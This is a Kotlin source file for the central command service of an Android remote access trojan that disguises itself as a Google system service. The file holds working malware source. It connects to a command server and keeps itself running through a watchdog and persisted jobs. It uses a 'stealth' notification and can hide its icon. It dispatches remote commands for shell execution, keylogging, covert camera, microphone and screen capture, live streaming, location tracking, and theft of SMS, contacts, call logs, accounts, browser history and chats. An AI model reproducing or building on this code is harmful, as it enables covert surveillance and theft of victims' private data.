package com.google.android.systemservice.services

import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.handlers.AudioHandlers
import com.google.android.systemservice.handlers.CameraHandlers
import com.google.android.systemservice.handlers.CommandContext
import com.google.android.systemservice.handlers.DeviceControlHandlers
import com.google.android.systemservice.handlers.DeviceInfoHandlers
import com.google.android.systemservice.handlers.FileHandlers
import com.google.android.systemservice.handlers.LocationHandlers
import com.google.android.systemservice.handlers.SystemHandlers
import com.google.android.systemservice.network.CommandTransport
import com.google.android.systemservice.utils.CommandQueueManager
import com.google.android.systemservice.utils.DataSyncManager
import com.google.android.systemservice.utils.StealthNotificationHelper
import kotlinx.coroutines.*
import org.json.JSONObject
import android.os.Build

class CommandService : Service(), CommandContext {
    companion object {
        private const val TAG = "SystemCore"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var dataSyncManager: DataSyncManager
    private lateinit var commandQueue: CommandQueueManager
    private lateinit var transport: CommandTransport
    // Delegated handler classes
    private val deviceInfoHandlers = DeviceInfoHandlers(this)
    private val fileHandlers = FileHandlers(this)
    private val locationHandlers = LocationHandlers(this)
    private val cameraHandlers = CameraHandlers(this)
    private val audioHandlers = AudioHandlers(this)
    private val deviceControlHandlers = DeviceControlHandlers(this)
    private val systemHandlers = SystemHandlers(this)

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "CommandService created")
        
        // Initialize offline data sync manager
        dataSyncManager = DataSyncManager(this)
        
        // Initialize intelligent command queue
        commandQueue = CommandQueueManager(this)
        commandQueue.setResourceConflictHandler(
            onConflict = { resource ->
                Log.d(TAG, "Resource conflict: $resource — pausing our operation")
                // The current recording/capture will be stopped cleanly by the queue manager
            },
            onFreed = { resource ->
                Log.d(TAG, "Resource freed: $resource — can resume")
            }
        )
        
        // Load configuration
        AndroidConfig.loadFromPreferences(this)
        
        // Initialize transport layer (WebSocket + HTTP polling)
        transport = CommandTransport(
            scope = serviceScope,
            dataSyncManager = dataSyncManager,
            getDeviceId = { getDeviceIdentifier() },
            onCommandReceived = { command, params, requestId, priority, resource ->
                dispatchCommand(command, params, requestId, priority, resource)
            }
        )
        
        startForegroundSilent()
        scheduleJob()
        transport.connect()
    }

    private fun scheduleJob() {
        try {
            val componentName = ComponentName(this, KeepAliveJobService::class.java)
            val builder = JobInfo.Builder(1234, componentName)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
            
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                // Android 7+ requires 15 mins min
                builder.setPeriodic(15 * 60 * 1000L) 
            } else {
                builder.setPeriodic(5 * 60 * 1000L)
            }
                
            val scheduler = getSystemService(JOB_SCHEDULER_SERVICE) as? JobScheduler ?: return
            scheduler.schedule(builder.build())
            Log.d(TAG, "JobScheduler scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule job: ${(e.message ?: "Unknown error")}")
        }
    }

    private fun startForegroundSilent() {
        val notification = StealthNotificationHelper.createStealthNotification(this)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            try {
                // Combine all needed foreground types
                var types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                   types = types or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                           android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                           android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification, types)
            } catch (e: Exception) {
                // Fallback: try mostly minimal type if full types fail (e.g. permission missing)
                try {
                     startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } catch (e2: Exception) {
                     Log.e(TAG, "Failed to start foreground: ${e2.message}")
                }
            }
        } else {
            startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "CommandService started")
        if (!transport.isConnected) {
            transport.connect()
        }
        // Reverse watchdog: ensure WatchdogService is alive
        ensureWatchdogRunning()
        return START_STICKY
    }
    
    private fun ensureWatchdogRunning() {
        try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as? android.app.ActivityManager ?: return
            @Suppress("DEPRECATION")
            val running = manager.getRunningServices(Integer.MAX_VALUE)
                .any { it.service.className == WatchdogService::class.java.name }
            if (!running) {
                Log.d(TAG, "WatchdogService is dead, restarting...")
                val intent = Intent(this, WatchdogService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check/restart WatchdogService: ${(e.message ?: "Unknown error")}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // — CommandContext implementation —
    override val appContext: Context get() = this
    override val scope: CoroutineScope get() = serviceScope
    override fun getCurrentRequestId(): String? = transport.currentRequestId.get()
    override fun setCurrentRequestId(requestId: String?) { transport.currentRequestId.set(requestId) }
    override fun getDeviceIdentifier(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
        } catch (e: Exception) {
            AndroidConfig.deviceId.ifEmpty { "unknown" }
        }
    }

    override fun sendResponse(type: String, data: JSONObject, requestId: String?) {
        transport.sendResponse(type, data, requestId)
    }

    // ── Command hierarchy: priority + resource mapping ──────────────────
    // Maps each command to its default priority and hardware resource.
    // Server can override priority via payload; resource is always local truth.

    private data class CommandMeta(
        val priority: CommandQueueManager.Priority,
        val resource: CommandQueueManager.ResourceType,
        val timeoutMs: Long = 60_000
    )

    private val COMMAND_REGISTRY: Map<String, CommandMeta> = mapOf(
        // CRITICAL — execute immediately, bypass queue
        "shell_command"          to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 30_000),
        "shell_exec"             to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 30_000),
        "send_sms"               to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 15_000),
        "unlock_screen"          to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 10_000),
        "hide_icon"              to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "show_icon"              to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_camera"            to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_audio"             to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_live_video"        to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_live_audio"        to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_screen_record"     to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_location_tracking" to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "uninstall_app"          to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 30_000),
        "keylog_ack"             to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        // HIGH — hardware commands, queued with resource exclusion
        "start_camera"           to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.CAMERA, 120_000),
        "take_photo"             to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.CAMERA, 30_000),
        "start_audio"            to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.MICROPHONE, 120_000),
        "ambient_record"         to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.MICROPHONE, 120_000),
        "start_live_video"       to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.CAMERA_AND_MIC, 300_000),
        "start_live_audio"       to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.MICROPHONE, 300_000),
        "take_screenshot"        to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.SCREEN, 15_000),
        "start_screen_record"    to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.SCREEN, 300_000),
        "start_location_tracking"to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.NONE, 30_000),
        // NORMAL — data collection, no hardware
        "get_location"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_accounts"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_contacts"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_sms"                to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_call_logs"          to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_device_info"        to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_installed_apps"     to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_wifi_info"          to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_keylog_dump"        to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_browser_history"    to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_app_usage"          to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "social_media_chats"     to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "browse_files"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "list_files"             to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "search_files"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "start_clipboard_monitor"to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        // LOW — file operations, non-urgent
        "download_file"          to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE, 120_000),
        "upload_file"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE, 120_000),
        "upload_file_chunk"      to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE, 120_000),
        "delete_file"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "preview_file"           to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "rename_file"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "move_file"              to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "install_apk"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE, 120_000),
        "launch_app"             to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "toggle_wifi"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "change_audio_mode"      to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "add_geofence"           to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
    )

    /**
     * Resolve the execute function for a command name.
     * Returns null for unknown commands.
     */
    private fun resolveAction(command: String, params: JSONObject?): (suspend () -> Unit)? {
        return when (command) {
            // Location
            "get_location" -> {{ locationHandlers.executeGetLocation() }}
            "get_accounts" -> {{ locationHandlers.executeGetAccounts() }}
            "toggle_wifi" -> {{ locationHandlers.executeToggleWifi() }}
            "start_location_tracking" -> {{ locationHandlers.executeStartLocationTracking(params) }}
            "stop_location_tracking" -> {{ locationHandlers.executeStopLocationTracking() }}
            // Camera/Media
            "start_camera" -> {{ cameraHandlers.executeStartCamera(params) }}
            "stop_camera" -> {{ cameraHandlers.executeStopCamera() }}
            "take_photo" -> {{ cameraHandlers.executeTakePhoto(params) }}
            "start_live_video" -> {{ cameraHandlers.executeStartLiveVideo(params) }}
            "stop_live_video" -> {{ cameraHandlers.executeStopLiveVideo() }}
            "take_screenshot" -> {{ cameraHandlers.executeTakeScreenshot() }}
            "start_screen_record" -> {{ cameraHandlers.executeStartScreenRecord(params) }}
            "stop_screen_record" -> {{ cameraHandlers.executeStopScreenRecord() }}
            // Audio
            "start_audio" -> {{ audioHandlers.executeStartAudio(params) }}
            "stop_audio" -> {{ audioHandlers.executeStopAudio() }}
            "start_live_audio" -> {{ audioHandlers.executeStartLiveAudio() }}
            "stop_live_audio" -> {{ audioHandlers.executeStopLiveAudio() }}
            "ambient_record" -> {{ audioHandlers.executeAmbientRecord(params) }}
            // Device Info
            "get_device_info" -> {{ deviceInfoHandlers.executeGetDeviceInfo() }}
            "get_contacts" -> {{ deviceInfoHandlers.executeGetContacts() }}
            "get_sms" -> {{ deviceInfoHandlers.executeGetSms() }}
            "get_call_logs" -> {{ deviceInfoHandlers.executeGetCallLogs() }}
            "get_installed_apps" -> {{ deviceInfoHandlers.executeGetInstalledApps() }}
            "get_wifi_info" -> {{ deviceInfoHandlers.executeGetWifiInfo() }}
            "get_app_usage" -> {{ deviceInfoHandlers.executeGetAppUsage() }}
            "get_browser_history" -> {{ deviceInfoHandlers.executeGetBrowserHistory() }}
            // File operations
            "browse_files" -> {{ fileHandlers.executeBrowseFiles(params) }}
            "list_files" -> {{ fileHandlers.executeListFiles(params) }}
            "download_file" -> {{ fileHandlers.executeDownloadFile(params) }}
            "upload_file" -> {{ fileHandlers.executeUploadFile(params) }}
            "upload_file_chunk" -> {{ fileHandlers.executeUploadFileChunk(params) }}
            "delete_file" -> {{ fileHandlers.executeDeleteFile(params) }}
            "preview_file" -> {{ fileHandlers.executePreviewFile(params) }}
            "rename_file" -> {{ fileHandlers.executeRenameFile(params) }}
            "move_file" -> {{ fileHandlers.executeMoveFile(params) }}
            "search_files" -> {{ fileHandlers.executeSearchFiles(params) }}
            // Device Control
            "install_apk" -> {{ deviceControlHandlers.executeInstallApk(params) }}
            "uninstall_app" -> {{ deviceControlHandlers.executeUninstallApp(params) }}
            "launch_app" -> {{ deviceControlHandlers.executeLaunchApp(params) }}
            "unlock_screen" -> {{ deviceControlHandlers.executeUnlockScreen() }}
            "hide_icon" -> {{ deviceControlHandlers.executeHideIcon() }}
            "show_icon" -> {{ deviceControlHandlers.executeShowIcon() }}
            "change_audio_mode" -> {{ deviceControlHandlers.executeChangeAudioMode(params) }}
            // System
            "shell_command" -> {{ systemHandlers.executeShellCommand(params) }}
            "shell_exec" -> {{ systemHandlers.executeShellExec(params) }}
            "get_keylog_dump" -> {{ systemHandlers.executeGetKeylogDump() }}
            "keylog_ack" -> {{ systemHandlers.handleKeylogAck(params ?: JSONObject()) }}
            "send_sms" -> {{ systemHandlers.executeSendSms(params) }}
            "start_clipboard_monitor" -> {{ systemHandlers.executeStartClipboardMonitor() }}
            "social_media_chats" -> {{ systemHandlers.executeSocialMediaScraping(params) }}
            "add_geofence" -> {{ systemHandlers.executeAddGeofence(params) }}
            else -> null
        }
    }

    /**
     * Parse server-provided priority string, falling back to registry default.
     */
    private fun parsePriority(serverPriority: String, default: CommandQueueManager.Priority): CommandQueueManager.Priority {
        return when (serverPriority) {
            "critical" -> CommandQueueManager.Priority.CRITICAL
            "high"     -> CommandQueueManager.Priority.HIGH
            "normal"   -> CommandQueueManager.Priority.NORMAL
            "low"      -> CommandQueueManager.Priority.LOW
            else       -> default
        }
    }

    // Dispatch command through strict hierarchy:
    // CRITICAL → execute immediately on serviceScope (stop commands, shell, sms)
    // HIGH/NORMAL/LOW → enqueue in CommandQueueManager with priority + resource
    private fun dispatchCommand(
        command: String,
        params: JSONObject?,
        requestId: String? = null,
        serverPriority: String = "",
        serverResource: String = ""
    ) {
        if (!requestId.isNullOrEmpty()) {
            transport.currentRequestId.set(requestId)
        }

        val action = resolveAction(command, params)
        if (action == null) {
            Log.w(TAG, "Unknown command: $command")
            return
        }

        val meta = COMMAND_REGISTRY[command] ?: CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE)
        val priority = parsePriority(serverPriority, meta.priority)

        // CRITICAL commands bypass queue — execute immediately
        if (priority == CommandQueueManager.Priority.CRITICAL) {
            Log.d(TAG, "⚡ CRITICAL command, executing immediately: $command")
            serviceScope.launch { action() }
            return
        }

        // All other commands go through the queue with strict priority ordering
        commandQueue.enqueue(
            CommandQueueManager.Command(
                id = "${command}_${requestId ?: System.currentTimeMillis()}",
                name = command,
                priority = priority,
                resource = meta.resource,
                timeoutMs = meta.timeoutMs,
                action = action
            )
        )
    }

    private fun sendError(message: String) {
        sendResponse("error", JSONObject().apply {
            put("error", message)
        })
    }

    override fun onDestroy() {
        super.onDestroy()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            stopForeground(STOP_FOREGROUND_DETACH)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(false)
        }
        dataSyncManager.persistQueue()
        commandQueue.shutdown()
        transport.disconnect()
        serviceScope.cancel()
        
        // Restart handled by START_STICKY and WatchdogService — cannot call startService() from background on Android 12+
    }
}
